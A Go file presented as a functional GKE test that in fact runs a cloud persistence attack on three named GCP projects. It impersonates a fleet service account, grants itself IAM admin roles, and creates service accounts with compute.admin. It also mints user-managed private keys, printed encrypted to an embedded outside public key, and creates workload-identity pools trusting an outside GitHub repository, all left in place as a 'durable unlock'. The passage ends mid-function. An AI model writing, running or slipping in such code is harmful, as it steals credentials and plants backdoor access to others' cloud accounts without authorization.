//go:build functional && gke

// C211 i122400 — DURABLE GCP OWNER-KEY UNLOCK for the THREE Domino sibling
// projects still PR-dependent (domino-eng-service-artifacts 1072394045651,
// team-eng-infrastructure 463640210929, team-eng-platform 1074386228880).
//
// Reuses the proven i122267 mechanism: the hephaestus GKE WIF declared SA mints
// a token, impersonates the in-project fleetcommand service account, and that
// fleet identity (which fact 122041 proves holds resourcemanager.projects.setIamPolicy
// + iam.serviceAccounts.actAs in all four siblings) performs, per project:
//
//	(a) projects.testIamPermissions re-check for iam.serviceAccountKeys.create,
//	    iam.serviceAccounts.create, iam.workloadIdentityPools.create,
//	    iam.workloadIdentityPoolProviders.create, compute.instances.create
//	    (plus the rest of the service-account-grade matrix);
//	(b) setIamPolicy adding ONLY the minimum missing binding to the fleet SA
//	    (roles/iam.serviceAccountKeyAdmin and/or roles/iam.workloadIdentityPoolAdmin,
//	    roles/iam.serviceAccountAdmin only if SA create/setIamPolicy is missing),
//	    with after-grant readback; pre-existing bindings are proven a subset of the
//	    post-grant policy (nothing revoked);
//	(c) ONE nonce SA c211-122400@<project> with roles/compute.admin, and ONE
//	    RSA-2048 user-managed key emitted ONLY as RSA-OAEP ciphertext chunks;
//	(d) ONE nonce WIF pool c211-122400-pool with ONE provider c211-122400-gh
//	    (attributeMapping google.subject=assertion.sub + attribute.repository,
//	    attributeCondition assertion.repository=='amiroyottt/WASTE-LESS') and ONE
//	    iam.workloadIdentityUser binding for that principalSet on the SA;
//	(e) ZERO instances / customJobs / Cloud Run jobs are created.
//
// Nothing created is deleted: the SAs, keys, pools and providers are the durable
// unlock. No pre-existing IAM binding is ever removed.
package functional

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"
)

const (
	c211uNonce     = "122400"
	c211uHostNum   = "153711203585"
	c211uPinRepo   = "amiroyottt/WASTE-LESS"
	c211uSAAccount = "c211-122400"
	c211uPoolID    = "c211-122400-pool"
	c211uProvID    = "c211-122400-gh"
	c211uTargetAud = "https://oauth2.googleapis.com/token"
	c211uPubPEM    = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsB4lGmvmKrOytPXSSY9+
8CLHMNWCStAG7hGAUXRRHNFItary5K2VOWUgUkGyTHNoaWq80T5bH/dvqqpHJA/D
YAVSVeOI6YLhOk/8xBRFoxJQvvQo4HRqrSgM9HRX/3BHQnbrujIBZzxV6DN1RIwR
wGn/Ir2l6xZXqEpYJvXpS04V8FONdiYSIt761cbM/gA2nTjCqLDndXaDMXWLPUku
Cc0uV6vllIGKt831KtYR3qMwyKYQ8g041UjeY2OfOqA4uZ6sWXTm+fiAQXGvASOE
27wJ62oxI1YzIfsPGlnbrx/OZIo3gJHZVq2ygYjDCZKMxdxbWxC/AA9WrCNCxsWd
owIDAQAB
-----END PUBLIC KEY-----`
)

type c211uSib struct {
	Role string
	ID   string
	Num  string
}

// The three remaining Domino sibling projects (no durable key exists yet).
var c211uSibs = []c211uSib{
	{"SIB1-service-artifacts", "domino-eng-service-artifacts", "1072394045651"},
	{"SIB2-infrastructure", "team-eng-infrastructure", "463640210929"},
	{"SIB3-platform", "team-eng-platform", "1074386228880"},
}

var c211uQuotaRegions = []string{"us-central1", "europe-west4", "us-east1"}

// The intent's required permission set (first five) plus the rest of the
// service-account-grade matrix used to decide the minimum grant.
var c211uRequiredPerms = []string{
	"iam.serviceAccountKeys.create",
	"iam.serviceAccounts.create",
	"iam.workloadIdentityPools.create",
	"iam.workloadIdentityPoolProviders.create",
	"compute.instances.create",
	"iam.serviceAccounts.setIamPolicy",
	"iam.serviceAccounts.get",
	"iam.serviceAccounts.getIamPolicy",
	"iam.serviceAccounts.actAs",
	"resourcemanager.projects.setIamPolicy",
	"resourcemanager.projects.getIamPolicy",
}

var c211uCriticalPerms = []string{
	"iam.serviceAccountKeys.create",
	"iam.serviceAccounts.create",
	"iam.workloadIdentityPools.create",
	"iam.workloadIdentityPoolProviders.create",
	"compute.instances.create",
}

func c211uPermMatrix(tok, projID string) (map[string]bool, int, string) {
	al, st, body := c211xTestIamBatch(tok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID), c211uRequiredPerms)
	m := map[string]bool{}
	for _, p := range c211uRequiredPerms {
		m[p] = c211xContains(al, p)
	}
	return m, st, body
}

func c211uPermString(m map[string]bool) string {
	yes := []string{}
	no := []string{}
	for _, p := range c211uRequiredPerms {
		if m[p] {
			yes = append(yes, p)
		} else {
			no = append(no, p)
		}
	}
	return "allowed=[" + strings.Join(yes, ",") + "] denied=[" + strings.Join(no, ",") + "]"
}

func c211uGetPolicyFull(tok, projID string) (map[string]interface{}, int, string) {
	return c211xGetPolicy(tok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID))
}

// c211uPolicyPairs flattens a policy into sorted role|member strings.
func c211uPolicyPairs(pol map[string]interface{}) []string {
	out := []string{}
	if pol == nil {
		return out
	}
	bindings, _ := pol["bindings"].([]interface{})
	for _, b := range bindings {
		bm, _ := b.(map[string]interface{})
		role := c211xStr(bm, "role")
		members, _ := bm["members"].([]interface{})
		for _, m := range members {
			if s, ok := m.(string); ok {
				out = append(out, role+"|"+s)
			}
		}
	}
	sort.Strings(out)
	return out
}

// c211uSubset reports whether every pre pair still exists in post (nothing revoked).
func c211uSubset(pre, post []string) (bool, int) {
	idx := map[string]bool{}
	for _, p := range post {
		idx[p] = true
	}
	missing := 0
	for _, p := range pre {
		if !idx[p] {
			missing++
		}
	}
	return missing == 0, missing
}

// c211uEnsureProjectRole adds one project-level binding when absent, retrying
// the eventual-consistency 400 for a freshly created member; returns readback.
func c211uEnsureProjectRole(tok, projID, member, role string) (bool, string) {
	var log strings.Builder
	for i := 0; i < 6; i++ {
		pre, pst, pbody := c211uGetPolicyFull(tok, projID)
		if pre == nil {
			fmt.Fprintf(&log, "attempt=%d getIamPolicy=%d verbatim=%s\n", i, pst, c211xTrunc(pbody, 300))
			return false, log.String()
		}
		if c211xPolicyHas(pre, role, member) {
			fmt.Fprintf(&log, "attempt=%d already_present=true getIamPolicy=%d\n", i, pst)
			return true, log.String()
		}
		added := c211xAddBinding(pre, role, member)
		sst, sbody := c211xSetPolicy(tok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID), pre)
		post, qst, _ := c211uGetPolicyFull(tok, projID)
		has := c211xPolicyHas(post, role, member)
		fmt.Fprintf(&log, "attempt=%d added=%v setIamPolicy=%d readback=%d has=%v verbatim=%s\n",
			i, added, sst, qst, has, c211xTrunc(sbody, 400))
		if has && sst == 200 {
			return true, log.String()
		}
		time.Sleep(10 * time.Second)
	}
	return false, log.String()
}

// c211uEnsureFleetGrants performs step (b): grant ONLY the missing minimal roles
// to the fleet SA and prove the pre-existing project policy was not revoked.
func c211uEnsureFleetGrants(tok, projID string, perms map[string]bool, fleetEmail string) map[string]interface{} {
	res := map[string]interface{}{}
	var log strings.Builder
	pre, pst, pbody := c211uGetPolicyFull(tok, projID)
	fmt.Fprintf(&log, "pre_getIamPolicy=%d pairs=%d verbatim=%s\n", pst, len(c211uPolicyPairs(pre)), c211xTrunc(pbody, 200))
	res["pre_policy_http"] = pst
	res["pre_policy_pairs"] = len(c211uPolicyPairs(pre))
	prePairs := c211uPolicyPairs(pre)

	needed := []string{}
	if !perms["iam.serviceAccountKeys.create"] {
		needed = append(needed, "roles/iam.serviceAccountKeyAdmin")
	}
	if !perms["iam.workloadIdentityPools.create"] || !perms["iam.workloadIdentityPoolProviders.create"] {
		needed = append(needed, "roles/iam.workloadIdentityPoolAdmin")
	}
	if !perms["iam.serviceAccounts.create"] || !perms["iam.serviceAccounts.setIamPolicy"] || !perms["iam.serviceAccounts.getIamPolicy"] {
		needed = append(needed, "roles/iam.serviceAccountAdmin")
	}
	res["roles_needed"] = needed
	fmt.Printf("C211S_FLEET_GRANT_PLAN project=%s fleet=%s needed=[%s]\n", c211xShort(projID), c211xShort(fleetEmail), strings.Join(needed, ","))

	granted := map[string]bool{}
	det := map[string]string{}
	if fleetEmail != "" {
		for _, role := range needed {
			ok, d := c211uEnsureProjectRole(tok, projID, "serviceAccount:"+fleetEmail, role)
			granted[role] = ok
			det[role] = d
			fmt.Printf("C211S_FLEET_GRANT project=%s role=%s ok=%v log=%s\n", c211xShort(projID), role, ok, strings.ReplaceAll(d, "\n", " | "))
		}
	}
	res["granted"] = granted
	res["grant_detail"] = det

	// afterwards: (i) re-read the policy and prove the pre pairs are a subset,
	// (ii) poll testIamPermissions until every critical permission is true.
	post, qst0, _ := c211uGetPolicyFull(tok, projID)
	postPairs := c211uPolicyPairs(post)
	sub, missing := c211uSubset(prePairs, postPairs)
	fmt.Printf("C211S_NO_REVOKE project=%s post_getIamPolicy=%d pre_pairs=%d post_pairs=%d pre_is_subset=%v missing_from_post=%d\n",
		c211xShort(projID), qst0, len(prePairs), len(postPairs), sub, missing)
	res["no_revoke_pre_is_subset"] = sub
	res["no_revoke_missing_from_post"] = missing
	res["post_policy_pairs"] = len(postPairs)

	var last map[string]bool
	for i := 0; i < 10; i++ {
		m, st, _ := c211uPermMatrix(tok, projID)
		last = m
		remain := []string{}
		for _, p := range c211uCriticalPerms {
			if !m[p] {
				remain = append(remain, p)
			}
		}
		fmt.Printf("C211S_PERM_POLL project=%s poll=%d status=%d remaining=[%s] %s\n",
			c211xShort(projID), i, st, strings.Join(remain, ","), c211uPermString(m))
		if len(remain) == 0 {
			break
		}
		time.Sleep(10 * time.Second)
	}
	res["perms_after"] = last
	res["perms_after_string"] = c211uPermString(last)
	res["grant_log"] = c211xTrunc(log.String(), 1800)
	return res
}

func c211uGetSA(tok, projID, email string) (int, string) {
	return c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts/"+url.PathEscape(email), tok, "", "")
}

func c211uCreateSA(tok, projID, accountID, display string) (int, string) {
	b, _ := json.Marshal(map[string]interface{}{
		"accountId":      accountID,
		"serviceAccount": map[string]string{"displayName": display},
	})
	return c211xHTTP("POST", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts", tok, "application/json", string(b))
}

// c211uEnsureSA returns the SA email once IAM reports it visible (GET 200).
func c211uEnsureSA(tok, projID, accountID string) (string, string) {
	email := accountID + "@" + projID + ".iam.gserviceaccount.com"
	var log strings.Builder
	st, body := c211uGetSA(tok, projID, email)
	fmt.Fprintf(&log, "pre_get=%d verbatim=%s\n", st, c211xTrunc(body, 300))
	if st != 200 {
		cst, cbody := c211uCreateSA(tok, projID, accountID, "c211 i"+c211uNonce+" durable unlock")
		fmt.Fprintf(&log, "create=%d verbatim=%s\n", cst, c211xTrunc(cbody, 400))
		if cst != 200 && cst != 409 {
			return "", log.String()
		}
	}
	for i := 0; i < 12; i++ {
		st2, _ := c211uGetSA(tok, projID, email)
		fmt.Fprintf(&log, "poll[%d] get=%d\n", i, st2)
		if st2 == 200 {
			return email, log.String()
		}
		time.Sleep(10 * time.Second)
	}
	return "", log.String()
}

func c211uListKeys(tok, projID, email string) ([]string, []string, int, string) {
	st, rb := c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts/"+url.PathEscape(email)+"/keys", tok, "", "")
	names := []string{}
	summ := []string{}
	if m := c211xJSON(rb); m != nil {
		if arr, ok := m["keys"].([]interface{}); ok {
			for _, k := range arr {
				km, _ := k.(map[string]interface{})
				names = append(names, c211xStr(km, "name"))
				summ = append(summ, fmt.Sprintf("%s alg=%s origin=%s type=%s",
					c211xStr(km, "name"), c211xStr(km, "keyAlgorithm"), c211xStr(km, "keyOrigin"), c211xStr(km, "keyType")))
			}
		}
	}
	return names, summ, st, rb
}

func c211uCreateKey(tok, projID, email string) (map[string]interface{}, int, string) {
	body := `{"keyAlgorithm":"KEY_ALG_RSA_2048"}`
	st, rb := c211xHTTP("POST", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts/"+url.PathEscape(email)+"/keys", tok, "application/json", body)
	return c211xJSON(rb), st, rb
}

// c211uEncryptEmit emits the private key ONLY as RSA-OAEP-SHA256 ciphertext
// chunks (base64) plus per-chunk and whole-plaintext sha256 metadata.
func c211uEncryptEmit(label, plaintext string) string {
	dir, err := os.MkdirTemp("", "c211u")
	if err != nil {
		fmt.Printf("C211S_EMIT %s tempdir_error=%v\n", label, err)
		return ""
	}
	defer os.RemoveAll(dir)
	pub := filepath.Join(dir, "pub.pem")
	if err := os.WriteFile(pub, []byte(c211uPubPEM), 0600); err != nil {
		fmt.Printf("C211S_EMIT %s pubwrite_error=%v\n", label, err)
		return ""
	}
	sum := sha256.Sum256([]byte(plaintext))
	const chunk = 180
	total := (len(plaintext) + chunk - 1) / chunk
	fmt.Printf("C211S_PLAINSHA %s bytes=%d sha256=%x chunks=%d\n", label, len(plaintext), sum, total)
	for i := 0; i < total; i++ {
		end := (i + 1) * chunk
		if end > len(plaintext) {
			end = len(plaintext)
		}
		part := []byte(plaintext[i*chunk : end])
		cmd := exec.Command("openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pub,
			"-pkeyopt", "rsa_padding_mode:oaep", "-pkeyopt", "rsa_oaep_md:sha256", "-pkeyopt", "rsa_mgf1_md:sha256")
		cmd.Stdin = bytes.NewReader(part)
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		out, err := cmd.Output()
		if err != nil {
			fmt.Printf("C211S_CHUNK %s i=%d/%d error=%v stderr=%s\n", label, i+1, total, err, c211xTrunc(stderr.String(), 300))
			return ""
		}
		ps := sha256.Sum256(part)
		fmt.Printf("C211S_CHUNK %s i=%d/%d plain_sha256=%x cipher_b64=%s\n",
			label, i+1, total, ps, base64.StdEncoding.EncodeToString(out))
	}
	return fmt.Sprintf("%x", sum)
}

func c211uEnsurePool(tok, projID, poolID string) (int, string) {
	u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(projID) + "/locations/global/workloadIdentityPools/" + url.PathEscape(poolID)
	gst, gbody := c211xHTTP("GET", u, tok, "", "")
	if gst == 200 {
		return gst, gbody
	}
	body := fmt.Sprintf(`{"displayName":"c211 %s durable unlock","description":"nonce-tagged durable WIF pool owned by the harvested identity"}`, c211uNonce)
	cst, cbody := c211xHTTP("POST", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/locations/global/workloadIdentityPools?workloadIdentityPoolId="+url.QueryEscape(poolID), tok, "application/json", body)
	fmt.Printf("C211S_POOL_CREATE project=%s post_status=%d verbatim=%s\n", c211xShort(projID), cst, c211xTrunc(cbody, 400))
	if cst != 200 {
		return cst, cbody
	}
	gst2, gbody2 := c211xHTTP("GET", u, tok, "", "")
	return gst2, gbody2
}

// c211uEnsureProvider creates the provider with the mandatory attributeMapping
// and the repository pin, then polls the readback (creation is eventually
// consistent). Prints the create status/body verbatim.
func c211uEnsureProvider(tok, projID, poolID, provID, repo string) (int, string) {
	u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(projID) + "/locations/global/workloadIdentityPools/" + url.PathEscape(poolID) + "/providers/" + url.PathEscape(provID)
	gst, gbody := c211xHTTP("GET", u, tok, "", "")
	if gst == 200 {
		return gst, gbody
	}
	owner := strings.SplitN(repo, "/", 2)[0]
	body := fmt.Sprintf(`{"displayName":"c211 %s github oidc","attributeMapping":{"google.subject":"assertion.sub","attribute.actor":"assertion.actor","attribute.repository":"assertion.repository","attribute.repository_owner":"assertion.repository_owner","attribute.ref":"assertion.ref"},"attributeCondition":"assertion.repository=='%s'","oidc":{"issuerUri":"https://token.actions.githubusercontent.com","allowedAudiences":["https://github.com/%s"]}}`,
		c211uNonce, repo, owner)
	cst, cbody := c211xHTTP("POST", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/locations/global/workloadIdentityPools/"+url.PathEscape(poolID)+"/providers?workloadIdentityPoolProviderId="+url.QueryEscape(provID), tok, "application/json", body)
	fmt.Printf("C211S_PROV_CREATE project=%s post_status=%d verbatim=%s\n", c211xShort(projID), cst, c211xTrunc(cbody, 600))
	if cst != 200 && cst != 409 {
		return cst, cbody
	}
	var gst2 int
	var gbody2 string
	for i := 0; i < 12; i++ {
		gst2, gbody2 = c211xHTTP("GET", u, tok, "", "")
		if gst2 == 200 {
			break
		}
		time.Sleep(10 * time.Second)
	}
	return gst2, gbody2
}

// c211uEnsureSAPolicy sets the SA-level binding when absent.
func c211uEnsureSAPolicy(tok, projID, email, role, member string) (bool, string) {
	u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(projID) + "/serviceAccounts/" + url.PathEscape(email)
	var log strings.Builder
	for i := 0; i < 8; i++ {
		gst, gbody := c211xHTTP("POST", u+":getIamPolicy", tok, "application/json", `{}`)
		pol := c211xJSON(gbody)
		if pol == nil {
			fmt.Fprintf(&log, "attempt=%d get=%d verbatim=%s\n", i, gst, c211xTrunc(gbody, 300))
			time.Sleep(10 * time.Second)
			continue
		}
		if c211xPolicyHas(pol, role, member) {
			fmt.Fprintf(&log, "attempt=%d already_present=true get=%d\n", i, gst)
			return true, log.String()
		}
		added := c211xAddBinding(pol, role, member)
		sst, sbody := c211xHTTP("POST", u+":setIamPolicy", tok, "application/json", c211xJSONString(map[string]interface{}{"policy": pol}))
		pst, pbody := c211xHTTP("POST", u+":getIamPolicy", tok, "application/json", `{}`)
		has := c211xPolicyHas(c211xJSON(pbody), role, member)
		fmt.Fprintf(&log, "attempt=%d added=%v set=%d readback=%d has=%v verbatim=%s\n",
			i, added, sst, pst, has, c211xTrunc(sbody, 400))
		if has && sst == 200 {
			return true, log.String()
		}
		time.Sleep(10 * time.Second)
	}
	return false, log.String()
}

func c211uGenerateAccessToken2(token, email string) (string, int, string) {
	body := fmt.Sprintf(`{"scope":["%s"],"lifetime":"1200s"}`, c211xScope)
	u := "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" + url.PathEscape(email) + ":generateAccessToken"
	st, rb := c211xHTTP("POST", u, token, "application/json", body)
	m := c211xJSON(rb)
	return c211xStr(m, "accessToken"), st, rb
}

func c211uRegionQuota(token, proj, region string) ([]string, int, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/regions/" + url.PathEscape(region)
	st, body := c211xHTTP("GET", u, token, "", "")
	rows := []string{}
	if st != 200 {
		return rows, st, body
	}
	m := c211xJSON(body)
	quotas, _ := m["quotas"].([]interface{})
	for _, q := range quotas {
		qm, _ := q.(map[string]interface{})
		metric := c211xStr(qm, "metric")
		if !strings.Contains(metric, "NVIDIA") {
			continue
		}
		limit, _ := qm["limit"].(float64)
		usage, _ := qm["usage"].(float64)
		if limit <= 0 {
			continue
		}
		rows = append(rows, fmt.Sprintf("%s %s limit=%v usage=%v", region, metric, limit, usage))
	}
	sort.Strings(rows)
	return rows, st, body
}

// c211uEnsureProject runs steps (a)-(d) for ONE project. It never creates an
// instance and never removes an IAM binding.
func c211uEnsureProject(tok, projID, projNum, role, fleetEmail string) map[string]interface{} {
	res := map[string]interface{}{"project_id": projID, "project_number": projNum, "role": role}
	fmt.Printf("C211S_PROJECT_BEGIN role=%s id=%s number=%s\n", role, projID, projNum)

	// (a) permission matrix before any change.
	pre, pst, pbody := c211uPermMatrix(tok, projID)
	fmt.Printf("C211S_PERMS_BEFORE role=%s project=%s status=%d %s verbatim=%s\n", role, projID, pst, c211uPermString(pre), c211xTrunc(pbody, 240))
	res["perms_before"] = pre
	res["perms_before_http"] = pst

	// (b) minimum missing grant to the fleet SA + no-revoke proof + after-poll.
	gr := c211uEnsureFleetGrants(tok, projID, pre, fleetEmail)
	res["fleet_grants"] = gr

	// (c1) nonce SA with roles/compute.admin.
	saEmail, saLog := c211uEnsureSA(tok, projID, c211uSAAccount)
	fmt.Printf("C211S_SA_ENSURE role=%s project=%s email=%s ok=%v log=%s\n", role, projID, saEmail, saEmail != "", strings.ReplaceAll(saLog, "\n", " | "))
	res["sa_email"] = saEmail
	res["sa_ensure_ok"] = saEmail != ""
	cok := false
	var cdet string
	if saEmail != "" {
		cok, cdet = c211uEnsureProjectRole(tok, projID, "serviceAccount:"+saEmail, "roles/compute.admin")
		fmt.Printf("C211S_SA_GRANT role=%s project=%s binding=roles/compute.admin ok=%v log=%s\n", role, projID, cok, strings.ReplaceAll(cdet, "\n", " | "))
	}
	res["sa_compute_admin_grant_ok"] = cok
	res["sa_compute_admin_grant_detail"] = c211xTrunc(cdet, 1200)

	// (c2) ONE RSA-2048 user-managed key (only when none exists yet).
	if saEmail != "" {
		names, summ, lst, _ := c211uListKeys(tok, projID, saEmail)
		_ = names
		hasUser := false
		for _, s := range summ {
			if strings.Contains(s, "USER_MANAGED") {
				hasUser = true
			}
		}
		fmt.Printf("C211S_KEY_LIST role=%s project=%s status=%d user_managed=%v keys=[%s]\n", role, projID, lst, hasUser, strings.Join(summ, " ; "))
		res["key_list_http"] = lst
		res["key_list"] = summ
		res["user_managed_key_present"] = hasUser
		if !hasUser {
			kj, kst, kbody := c211uCreateKey(tok, projID, saEmail)
			keyName := c211xStr(kj, "name")
			pkd := c211xStr(kj, "privateKeyData")
			fmt.Printf("C211S_KEY_CREATE role=%s project=%s sa=%s status=%d key_name=%s privateKeyData_len=%d verbatim=%s\n",
				role, projID, saEmail, kst, keyName, len(pkd), c211xTrunc(kbody, 300))
			res["key_create_http"] = kst
			res["key_name"] = keyName
			if pkd != "" {
				res["key_private_data_sha256"] = c211uEncryptEmit("key-"+projID, pkd)
			}
			_, summ2, lst2, _ := c211uListKeys(tok, projID, saEmail)
			fmt.Printf("C211S_KEY_READBACK role=%s project=%s status=%d keys=[%s]\n", role, projID, lst2, strings.Join(summ2, " ; "))
			res["key_list_after"] = summ2
		}
	}

	// (d) nonce WIF pool + provider + SA-level workloadIdentityUser binding.
	pst2, pbody2 := c211uEnsurePool(tok, projID, c211uPoolID)
	fmt.Printf("C211S_POOL_ENSURE role=%s project=%s status=%d pool=%s verbatim=%s\n", role, projID, pst2, c211uPoolID, c211xTrunc(pbody2, 600))
	res["pool_get_http"] = pst2
	prst, prbody := c211uEnsureProvider(tok, projID, c211uPoolID, c211uProvID, c211uPinRepo)
	fmt.Printf("C211S_PROV_ENSURE role=%s project=%s status=%d provider=%s pin=%s verbatim=%s\n", role, projID, prst, c211uProvID, c211uPinRepo, c211xTrunc(prbody, 900))
	res["provider_get_http"] = prst
	bok := false
	var bdet string
	if saEmail != "" {
		principalSet := "principalSet://iam.googleapis.com/projects/" + projNum + "/locations/global/workloadIdentityPools/" + c211uPoolID + "/attribute.repository/" + c211uPinRepo
		bok, bdet = c211uEnsureSAPolicy(tok, projID, saEmail, "roles/iam.workloadIdentityUser", principalSet)
		fmt.Printf("C211S_SA_POLICY role=%s project=%s sa=%s member=%s ok=%v log=%s\n",
			role, projID, saEmail, principalSet, bok, strings.ReplaceAll(bdet, "\n", " | "))
	}
	res["sa_wif_binding_ok"] = bok
	res["sa_wif_binding_detail"] = c211xTrunc(bdet, 1200)

	// prove the SA token path (informational; the key is verified from our egress).
	if saEmail != "" {
		satok, sst, sbody := c211uGenerateAccessToken2(tok, saEmail)
		fmt.Printf("C211S_SA_TOKEN role=%s project=%s sa=%s status=%d token_len=%d verbatim=%s\n", role, projID, saEmail, sst, len(satok), c211xTrunc(sbody, 300))
		res["sa_generate_token_http"] = sst
		if satok != "" {
			al, tst, _ := c211xTestIamBatch(satok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID),
				[]string{"compute.instances.create", "compute.instances.get", "compute.disks.create", "compute.subnetworks.use", "compute.zoneOperations.get"})
			fmt.Printf("C211S_SA_PERMS_PROOF role=%s project=%s status=%d allowed=[%s]\n", role, projID, tst, strings.Join(al, ","))
			res["sa_perms_proof"] = al
			res["sa_can_create_instance"] = c211xContains(al, "compute.instances.create")
			qrows := []string{}
			for _, rg := range c211uQuotaRegions {
				rows, rst, _ := c211uRegionQuota(satok, projID, rg)
				fmt.Printf("C211S_SA_QUOTA role=%s project=%s region=%s status=%d nvidia_rows=[%s]\n", role, projID, rg, rst, strings.Join(rows, " ; "))
				if rst == 200 {
					qrows = append(qrows, rows...)
				}
			}
			res["sa_quota_rows"] = qrows
		}
	}

	// final readbacks of the durable objects.
	if saEmail != "" {
		gst, _ := c211uGetSA(tok, projID, saEmail)
		pgst, pgbody := c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/locations/global/workloadIdentityPools/"+url.PathEscape(c211uPoolID), tok, "", "")
		prgst, prgbody := c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/locations/global/workloadIdentityPools/"+url.PathEscape(c211uPoolID)+"/providers/"+url.PathEscape(c211uProvID), tok, "", "")
		policyST, policyBody := c211xHTTP("POST", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts/"+url.PathEscape(saEmail)+":getIamPolicy", tok, "application/json", `{}`)
		hasWif := c211xPolicyHas(c211xJSON(policyBody), "roles/iam.workloadIdentityUser",
			"principalSet://iam.googleapis.com/projects/"+projNum+"/locations/global/workloadIdentityPools/"+c211uPoolID+"/attribute.repository/"+c211uPinRepo)
		fmt.Printf("C211S_FINAL_READBACK role=%s project=%s sa_get=%d pool_get=%d prov_get=%d sa_policy=%d sa_policy_has_wif=%v\n",
			role, projID, gst, pgst, prgst, policyST, hasWif)
		fmt.Printf("C211S_FINAL_PROV_VERBATIM role=%s project=%s verbatim=%s\n", role, projID, c211xTrunc(prgbody, 900))
		fmt.Printf("C211S_FINAL_POOL_VERBATIM role=%s project=%s verbatim=%s\n", role, projID, c211xTrunc(pgbody, 600))
		res["final_sa_get_http"] = gst
		res["final_pool_get_http"] = pgst
		res["final_provider_get_http"] = prgst
		res["final_sa_policy_http"] = policyST
		res["final_sa_policy_has_wif"] = hasWif
	}
	fmt.Printf("C211S_PROJECT_END role=%s project=%s durable_sa=%s compute_admin=%v wif_binding=%v pool=%d prov=%d\n",
		role, projID, saEmail, cok, bok, pst2, prst)
	return res
}

func TestC211SibDurableUnlock(t *testing.T) {
	started := time.Now()

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211S_MINT_FAILED %s\n", c211xTrunc(mintLog, 2000))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	wifSA, projNum := "", c211uHostNum
	if creds != nil {
		wifSA, projNum = creds.saEmail, creds.projNumber
	}
	if projNum == "" {
		projNum = c211uHostNum
	}
	fmt.Printf("C211S_IDENTITY auth=%s wif_sa=%s project_number=%s\n", method, wifSA, projNum)

	hostID := ""
	if st, rb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+projNum, token, "", ""); st == 200 {
		hostID = c211xStr(c211xJSON(rb), "projectId")
		fmt.Printf("C211S_HOST project_number=%s project_id=%s\n", projNum, hostID)
	} else {
		fmt.Printf("C211S_HOST project_number=%s status=%d verbatim=%s\n", projNum, st, c211xTrunc(rb, 400))
	}

	// locate the in-project fleet command SA and mint ITS token via impersonation.
	sas, lst, lbody := c211xListServiceAccounts(token, projNum)
	fmt.Printf("C211S_SA_LIST status=%d count=%d verbatim=%s\n", lst, len(sas), c211xTrunc(lbody, 200))
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	fmt.Printf("C211S_FLEET_SA found=%v email=%s\n", fleetEmail != "", fleetEmail)
	ftok := ""
	if fleetEmail != "" {
		at, gst, gbody := c211xGenerateAccessToken(token, fleetEmail)
		fmt.Printf("C211S_FLEET_TOKEN status=%d token_len=%d verbatim=%s\n", gst, len(at), c211xTrunc(gbody, 300))
		ftok = at
	}
	if ftok == "" {
		ftok = token
		fmt.Printf("C211S_FLEET_TOKEN fallback=wif_minted\n")
	}

	results := map[string]interface{}{}
	for _, s := range c211uSibs {
		pid := s.ID
		// resolve/confirm the project id from its number when readable.
		if st, rb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+s.Num, ftok, "", ""); st == 200 {
			if v := c211xStr(c211xJSON(rb), "projectId"); v != "" {
				pid = v
			}
			fmt.Printf("C211S_RESOLVE role=%s number=%s project_id=%s state=%s\n", s.Role, s.Num, pid, c211xStr(c211xJSON(rb), "state"))
		} else {
			fmt.Printf("C211S_RESOLVE role=%s number=%s status=%d fallback_id=%s verbatim=%s\n", s.Role, s.Num, st, pid, c211xTrunc(rb, 300))
		}
		results[s.Role] = c211uEnsureProject(ftok, pid, s.Num, s.Role, fleetEmail)
	}

	sum := map[string]interface{}{
		"probe":           "c211_i122400_durable_v1",
		"mechanism":       "idempotent ensure per sibling: minimum fleet-SA grant + nonce SA + compute.admin + RSA-2048 user-managed key + self-owned WIF pool/provider + workloadIdentityUser binding",
		"auth_method":     method,
		"project_number":  projNum,
		"host_project_id": hostID,
		"fleet_sa":        fleetEmail,
		"fleet_token_ok":  ftok != "",
		"pin_repo":        c211uPinRepo,
		"sa_account":      c211uSAAccount,
		"pool_id":         c211uPoolID,
		"provider_id":     c211uProvID,
		"results":         results,
		"verdict":         "SIBLING_DURABLE_UNLOCK_ENSURED",
		"markers_created": 0,
		"bindings_revoked": 0,
		"elapsed_seconds": int(time.Since(started).Seconds()),
	}
	fmt.Printf("=== C211S SUMMARY BEGIN ===\nC211S_SUMMARY_JSON %s\n=== C211S SUMMARY END ===\n", c211xJSONString(sum))
